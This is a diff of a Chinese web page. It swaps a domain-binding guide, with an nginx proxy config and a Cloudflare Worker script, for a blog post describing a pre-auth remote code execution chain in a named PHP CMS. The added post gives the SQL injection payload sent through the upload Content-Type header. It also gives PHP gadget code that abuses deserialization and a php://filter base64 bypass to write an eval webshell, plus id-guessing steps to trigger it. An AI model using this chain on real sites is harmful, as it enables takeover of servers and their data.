@@ -22,7 +22,7 @@
 
 
     <script src="https://file.depy.ink/theme/docs/js/lightbox-plus-jquery.min.js"> </script>
-    <link href="https://file.depy.ink/theme/docs/css/lightbox.css?v=3328" rel="stylesheet"><title>📑 租户自定义域名绑定</title>
+    <link href="https://file.depy.ink/theme/docs/css/lightbox.css?v=3328" rel="stylesheet"><title>P***OK全版本前台无条件RCE</title>
 </head>
 
 <body class="bg-light ready sticky" id="watermark">
@@ -136,262 +136,190 @@
 
             <article class="markdown-section" id="main" style="word-break:break-all;">
                 <div>
-                <h1>📑 租户自定义域名绑定</h1>
+                <h1>P***OK全版本前台无条件RCE</h1>
 
 
                 <a style="font-size:12px;color: #5f5d5d;">
-                | 时间: 2023-10-06 21:31:43| 目录:DepyDocs </a>
+                | 时间: 2024-02-09 12:58:52| 目录:博客文章（备份） </a>
                 |
                 <a style="font-size:12px;color: #007bff;" href="http://10.8.0.3:5080/tenantadmin/Tenantarticle/quickedit/quickedit.html?id=118" target="_blank">编辑本文</a>
                 <br>
 
 
-                    <div id="content"><textarea style="display: none;">## 介绍
-DepyDocs提供域名绑定的功能，供用户定制化使用服务，本人提供提供以下两种绑定方式。
-### 基于Nginx反向代理（需要服务器）
-域名解析服务器后使用nginx反向代理，配置文件如下，注意修改租户id。
-```bash
-#PROXY-START/
+                    <div id="content"><textarea style="display: none;">## 利用条件
+网站未关闭游客附件上传（默认开启）
 
-location ^~ /
-{
-    proxy_pass https://rce.ink/index/tenant/租户id/;
-    proxy_set_header Host rce.ink;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_set_header REMOTE-HOST $remote_addr;
-    
-    add_header X-Cache $upstream_cache_status;
-    
-    #Set Nginx Cache
-    
-    
-    set $static_fileB0Aqg0HO 0;
-    if ( $uri ~* &#34;\.(gif|png|jpg|css|js|woff|woff2)$&#34; )
-    {
-    	set $static_fileB0Aqg0HO 1;
-    	expires 12h;
-        }
-    if ( $static_fileB0Aqg0HO = 0 )
-    {
-    add_header Cache-Control no-cache;
-    }
-}
+## 代码审计
 
-#PROXY-END/
+首先我们进行正常的普通附件上传，发现无论什么图片都无法上传:
+
+![](https://img.meituan.net/imgupload/ed47ab21f89e54a6666a7ac74673f12116944.png)
+
+查看upload控制器代码,代码位于目录/framework/www/中,查看save这个function：
+
+![](https://img.meituan.net/imgupload/b6a068c8ea52e51fd60017d041c05f4a55106.png)
+
+跟进upload_base方法:
+
+![](https://img.meituan.net/imgupload/abd27e03d4e1ee7d56b3963520c5223799145.png)
+
+继续跟进getfile方法：
+
+![](https://img.meituan.net/imgupload/1cacf4b1d6d58516f1873bf81e99115d53329.png)
+
+在此处vardump有输出，所以进入了upload的方法。继续跟进:
+
+![](https://img.meituan.net/imgupload/861e843080ff3bd5ed128296bbe389d072922.png)
+
+![](https://img.meituan.net/imgupload/0377dcfa4d27e7b9e2d1713ee62b8a7266307.png)
+
+我们发现最终是在这里进行了return,原因就是进入了if($bin),如何bypass这个判断呢？
+
+必须要获取$bin变量才可以进入判断，通过var_dump发现就是图片内容。将图片文件内容置空,上传成功
+
+![](https://img.meituan.net/imgupload/9b5aa738632421d6d8a3b4fbadb6883334129.png)
+
+我们回到base_upload方法:
+
+![](https://img.meituan.net/imgupload/3d69fa6ebe4111f4bbe866f5c819c674109391.png)
+
+我们发现这里有个model-&gt;save的方法，跟进save方法：
+
+![](https://img.meituan.net/imgupload/61708fd615224c5c3afd7a045892bbda63884.png)
+
+发现无论是否登录,都有一个插入数据库的方法，并且没有过滤。也就是说他直接将数组$array全部插入了数据库，那我们可以var_dump一下看看有哪些数组字段可控：
+
+![](https://img.meituan.net/imgupload/51bf7b6d42e6e89d7794afae3b8c142486276.png)
+
+我们打印数组后可发现,mime_type字段直接来自于content-type。并且是可控的,我们可以打印一段SQL语句,然后进行拼接操作（不做演示）,最终获取payload:
+
+```
+&#39;,sleep(5))#
 ```
 
-### 基于CloudFlare Workers（无需服务器）
-修改DNS服务器为cloudflare提供的DNS服务器。
-![](https://p1.meituan.net/xianfu/a3c71cb47835f44ad4b2c50428b4c9709238.png%40watermark=1&&object=L3dkY2Zsb3cvN2RiN2M4NTFjYmVjZDg4MTM1OTZjMTYzOWE2MzQ4MDM0MjY0LnBuZw==&p=8&t=90&x=10&y=10)
-解析成功后，访问
-![](https://p0.meituan.net/xianfu/4846ff3283221d83d5de95d26b1b083198878.png%40watermark=1&&object=L3dkY2Zsb3cvN2RiN2M4NTFjYmVjZDg4MTM1OTZjMTYzOWE2MzQ4MDM0MjY0LnBuZw==&p=8&t=90&x=10&y=10)
-![](https://p0.meituan.net/xianfu/132aefef4294339b54cdc522b82f97d195614.png%40watermark=1&&object=L3dkY2Zsb3cvN2RiN2M4NTFjYmVjZDg4MTM1OTZjMTYzOWE2MzQ4MDM0MjY0LnBuZw==&p=8&t=90&x=10&y=10)
+![](https://img.meituan.net/imgupload/20ca7928c0298c9f921c0a6652396b5d125044.png)
 
-点击部署后，重新进入编辑界面，替换代码为下面的代码。
-```javascript
-// 目标网站
-const upstream = &#39;rce.ink&#39;
+我们发现成功sleep了。至此,我们审计到了一个SQL注入漏洞。但是如何通过SQL注入到达RCE呢。 
 
-// 目标网站路径
-const upstream_path = &#39;/index/tenant/租户id/&#39;
+![](https://img.meituan.net/imgupload/8c7508ef45190b28e99a1157d5d9336146109.png)
 
-// 打算为使用移动设备的用户检索的网站.
-const upstream_mobile = &#39;rce.ink&#39;
+继续查看代码发现对attr字段进行了序列化操作,所以有序列化肯定有反序列化。所以抛出第一个问题，如何覆盖序列化的内容？
 
-// 您希望暂停服务的国家和地区
-const blocked_region = []
+**1、覆盖**
 
-// 要阻止其使用服务的IP地址
-const blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;]
+我们在这里打印数组:
 
-// 上游地址是否使用HTTPS协议
-const https = true
+![](https://img.meituan.net/imgupload/4869656c145bb74d74c6fe4a6efaf845105777.png)
 
-// 是否禁用缓存
-const disable_cache = false
+我们继续观察SQL语句:
 
-// 替换文本
-//格式：  &#39;被替换&#39;:&#39;替换&#39;
-//注意js结束的的逗号
-const replace_dict = {
-    // &#39;www.google.com&#39;:&#39;yourworkername.yourusername.workers.dev&#39;
-}
+插入:
 
-let data={}
-addEventListener(&#39;fetch&#39;, event =&gt; {
-    event.respondWith(fetchAndApply(event.request));
-})
-
-async function fetchAndApply(request) {
-    const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase();
-    const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;);
-    const user_agent = request.headers.get(&#39;user-agent&#39;);
-
-    let response = null;
-    let url = new URL(request.url);
-    let url_hostname = url.hostname;
-
-    if (https == true) {
-        url.protocol = &#39;https:&#39;;
-    } else {
-        url.protocol = &#39;http:&#39;;
-    }
-
-    if (await device_status(user_agent)) {
-        var upstream_domain = upstream;
-    } else {
-        var upstream_domain = upstream_mobile;
-    }
-
-    url.host = upstream_domain;
-    if (url.pathname == &#39;/&#39;) {
-        url.pathname = upstream_path;
-    } else {
-        url.pathname = upstream_path &#43; url.pathname;
-    }
-
-    if (blocked_region.includes(region)) {
-        response = new Response(&#39;拒绝访问: 您所在的地区不可用!&#39;, {
-            status: 403
-        });
-    } else if (blocked_ip_address.includes(ip_address)) {
-        response = new Response(&#39;拒绝访问: 您的IP地址在Ban列表中!&#39;, {
-            status: 403
-        });
-    } else {
-        let method = request.method;
-        let request_headers = request.headers;
-        let new_request_headers = new Headers(request_headers);
-
-        new_request_headers.set(&#39;Host&#39;, upstream_domain);
-        new_request_headers.set(&#39;Referer&#39;, url.protocol &#43; &#39;//&#39; &#43; upstream_domain);
-
-        
-
-        if(method == &#39;POST&#39;){
-            let origin_formData = await request.text()
-            data = {
-                method: method,
-                headers: new_request_headers,
-                body : origin_formData
-            }
-            console.log(data)
-        }else if(method == &#39;GET&#39;){
-            data = {
-                method: method,
-                headers: new_request_headers
-            }
-        }
-        let fuckKeys =  Object.fromEntries(new_request_headers)
-        console.log(method)
-        console.log(fuckKeys)
-        let original_response = await fetch(url.href, data)
-
-        connection_upgrade = new_request_headers.get(&#34;Upgrade&#34;);
-        if (connection_upgrade && connection_upgrade.toLowerCase() == &#34;websocket&#34;) {
-            return original_response;
-        }
-
-        let original_response_clone = original_response.clone();
-        let original_text = null;
-        let response_headers = original_response.headers;
-        let new_response_headers = new Headers(response_headers);
-        let status = original_response.status;
-		
-		if (disable_cache) {
-			new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;);
-	    }
-
-        new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;);
-        new_response_headers.set(&#39;access-control-allow-credentials&#39;, true);
-        new_response_headers.delete(&#39;content-security-policy&#39;);
-        new_response_headers.delete(&#39;content-security-policy-report-only&#39;);
-        new_response_headers.delete(&#39;clear-site-data&#39;);
-		
-		if (new_response_headers.get(&#34;x-pjax-url&#34;)) {
-            new_response_headers.set(&#34;x-pjax-url&#34;, response_headers.get(&#34;x-pjax-url&#34;).replace(&#34;//&#34; &#43; upstream_domain, &#34;//&#34; &#43; url_hostname));
-        }
-		
-        const content_type = new_response_headers.get(&#39;content-type&#39;);
-        if (content_type != null && content_type.includes(&#39;text/html&#39;) && content_type.includes(&#39;UTF-8&#39;)) {
-            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);
-        } else {
-            original_text = original_response_clone.body
-        }
-		
-        response = new Response(original_text, {
-            status,
-            headers: new_response_headers
-        })
-    }
-    
-    return response;
-}
-
-async function replace_form_data(formData, upstream_domain, host_name) {
-    let text = await response.text()
-
-    var i, j;
-    for (i in replace_dict) {
-        j = replace_dict[i]
-        if (i == &#39;$upstream&#39;) {
-            i = upstream_domain
-        } else if (i == &#39;$custom_domain&#39;) {
-            i = host_name
-        }
-
-        if (j == &#39;$upstream&#39;) {
-            j = upstream_domain
-        } else if (j == &#39;$custom_domain&#39;) {
-            j = host_name
-        }
-
-        let re = new RegExp(i, &#39;g&#39;)
-        text = text.replace(re, j);
-    }
-    return text;
-}
-
-async function replace_response_text(response, upstream_domain, host_name) {
-    let text = await response.text()
-
-    var i, j;
-    for (i in replace_dict) {
-        j = replace_dict[i]
-        if (i == &#39;$upstream&#39;) {
-            i = upstream_domain
-        } else if (i == &#39;$custom_domain&#39;) {
-            i = host_name
-        }
-
-        if (j == &#39;$upstream&#39;) {
-            j = upstream_domain
-        } else if (j == &#39;$custom_domain&#39;) {
-            j = host_name
-        }
-
-        let re = new RegExp(i, &#39;g&#39;)
-        text = text.replace(re, j);
-    }
-    return text;
-}
-
-
-async function device_status(user_agent_info) {
-    var agents = [&#34;Android&#34;, &#34;iPhone&#34;, &#34;SymbianOS&#34;, &#34;Windows Phone&#34;, &#34;iPad&#34;, &#34;iPod&#34;];
-    var flag = true;
-    for (var v = 0; v &lt; agents.length; v&#43;&#43;) {
-        if (user_agent_info.indexOf(agents[v]) &gt; 0) {
-            flag = false;
-            break;
-        }
-    }
-    return flag;
-}
 ```
-### 注意
-请在后台绑定域名，否则会导致资源错误。</textarea></div>
+INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`user_id`,`mime_type`,`attr`) VALUES(&#39;&#39;,&#39;res/&#39;,&#39;db0846bb72407e1c.png&#39;,&#39;png&#39;,&#39;res/db0846bb72407e1c.png&#39;,&#39;1608034638&#39;,&#39;3&#39;,&#39;0o8592k55lo99m8r9hg27roid8&#39;,&#39;&#39;,&#39;image/png&#39;,sleep(5))#&#39;,&#39;a:2:{s:5:&#34;width&#34;;i:622;s:6:&#34;height&#34;;i:503;}&#39;)
+```
+
+响应:
+
+```
+{&#34;status&#34;:&#34;ok&#34;,&#34;content&#34;:{&#34;id&#34;:&#34;117&#34;,&#34;cate_id&#34;:&#34;1&#34;,&#34;folder&#34;:&#34;res\\\\/&#34;,&#34;name&#34;:&#34;db0846bb72407e1c.png&#34;,&#34;ext&#34;:&#34;png&#34;,&#34;filename&#34;:&#34;res\\\\/db0846bb72407e1c.png&#34;,&#34;ico&#34;:&#34;res\\\\/_cache\\\\/_ico\\\\/11\\\\/117.png&#34;,&#34;addtime&#34;:&#34;1608034638&#34;,&#34;title&#34;:&#34;3&#34;,&#34;attr&#34;:&#34;0&#34;,&#34;note&#34;:&#34;&#34;,&#34;session_id&#34;:&#34;0o8592k55lo99m8r9hg27roid8&#34;,&#34;user_id&#34;:&#34;0&#34;,&#34;download&#34;:&#34;0&#34;,&#34;admin_id&#34;:&#34;0&#34;,&#34;mime_type&#34;:&#34;image\\\\/png&#34;,&#34;etype&#34;:&#34;0&#34;,&#34;uploadtime&#34;:&#34;2020-12-15 20:17:18&#34;}}
+```
+
+发现我们可控的字段和attr字段相邻，所以进而我们可以直接覆盖attr变量。
+
+什么意思呢？就比如我们可以构造语句为:
+
+![](https://img.meituan.net/imgupload/cdbf4a7a38716a3725966c2d956cbce015038.png)
+
+单引号闭合前面字段的插入,分割后 ) 闭合最前面的括号,然后#注释多余语句。
+
+执行后我们访问数据库:
+
+![](https://img.meituan.net/imgupload/85eb213b4347762bee59fc242eb542fc168824.png)
+
+**2、追加**
+
+再写一条insert 的sql语句，使用英文逗号分割追加即可，具体可见ichunqiu本人对此案例的讲解。这里不赘述。
+
+发现res模型中getone方法就有反序列化操作:
+
+![](https://img.meituan.net/imgupload/30e6fc75991ad1d89df25cf2e304aa7b70379.png)
+
+然后就是写一个可以造成getshell的gadget就行了。但是怎么找呢?
+
+我们成功找到了一个cache类,路径如图所示:
+
+![](https://img.meituan.net/imgupload/c7b90fee7ec5dda1bd2f4d882bb067b794946.png)
+
+它在反序列化的时候会触发destruct魔法函数:
+
+![](https://img.meituan.net/imgupload/a249b3fb8d9e1b1f9e64f982a105eb4513314.png)
+
+跟进save,发现这里有一个file_put_contents的操作:
+
+![](https://img.meituan.net/imgupload/215f4e2e274b4dbecdb7c9dec320cbaf42805.png)
+
+但是这里注意的是为了防止木马生成,加入了exit函数,这个我们在做一道CTF题的时候经常会使用的bypass方法,就是使用:
+``` php
+file_put_contents(php://filter/write=convert.base64-decode/resource=$id.php,&#39;&lt;?php exit();?&gt;&#39;.base64编码的shellcode)
+```
+
+这样外放文件的时候会对整个内容base64解码,导致前面的内容发生错误,而base64编码的shellcode会正常还原。 我们发现他还对我们传入的content进行了序列化的操作，但是序列化不会改变字符串的内容，也就是我们传入的base64编码后的shell内容。
+
+所以最终构造的gadget如下:
+
+``` php
+&lt;?php
+ class cache{
+     protected $key_id;
+     protected $key_list;
+     protected $folder;
+  
+     public function __construct(){
+         $this-&gt;key_id = &#39;depy&#39;;
+         $this-&gt;key_list = &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_GET[&#34;shell&#34;]);?&gt;&#39;);
+         $this-&gt;folder = &#39;php://filter/write=convert.base64-decode/resource=&#39;;
+     }
+ }
+ 
+ echo bin2hex(serialize(new cache()));
+ ```
+ 
+这样,触发反序列化之后,将会在根目录生成depy.php的webshell,密码是shell。那么gadget写完之后,就是找怎么前台可以调用到get_one方法的地方了。
+
+![](https://img.meituan.net/imgupload/a978ea9dc195725a705cd53fb15bca7e78200.png)
+
+我们找到控制器下的replace方法,它根据get oldid参数，然后进入数据库找到我们上传的图片。然后调用get_one方法,触发反序列化。
+
+例如上传图片时,对content type写入我们的gadget。
+
+![](https://img.meituan.net/imgupload/f867a1a80a44e8ac3156a8fc7d2472c2107432.png)
+
+但实际上他并不会响应，插入数据库的时候其实已经触发了反序列化了，会导致服务空白响应。（具体哪里我没有去跟，下面其实也不用去触发）
+
+但是如果是常规流程呢？如何知道id？两个办法：
+
+1、爆破
+
+附件id是自增增加的，不超过四位数，爆破一遍强制触发
+
+2、预上传
+
+先上传一个无效的文件，记住id，那么反序列化时id就是&#43;1
+
+## Exploit
+![](https://img.meituan.net/imgupload/305765a85aa3dad77b207f45071f3a419468.png)
+
+通过id,进入replace方法,oldid为上面的id。
+
+![](https://img.meituan.net/imgupload/1f9f13b15cc8c93993eaf04b0b5b6e3636722.png)
+
+通过oldid,会最终触发反序列化生成webshell到根目录。
+
+![](https://img.meituan.net/imgupload/bb02b3d8b501cce3700837bc6ddcb67f80276.png)
+
+![](https://img.meituan.net/imgupload/8c8f013286bbc705370d1dda68a3adb5136947.png)
+</textarea></div>
 
 
                 <script>
